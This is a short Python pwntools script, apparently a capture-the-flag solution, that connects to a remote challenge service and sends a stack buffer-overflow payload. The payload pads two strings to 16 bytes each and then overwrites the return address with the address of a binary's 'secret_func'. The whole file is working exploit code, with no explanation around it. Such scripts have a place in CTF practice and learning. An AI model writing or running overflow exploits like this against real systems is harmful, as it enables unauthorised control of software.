from pwn import *

# p = process("./2")
p = remote("rev.danissimurr.ru", 5252)
elf = ELF("./2")

payload = b"admin\x00".ljust(16, b"\x00")
payload += b"qwert\x00".ljust(16, b"\x00")
payload += p64(elf.symbols['secret_func'])

p.sendlineafter(b"Enter name: ", payload)

print(p.recvall().decode())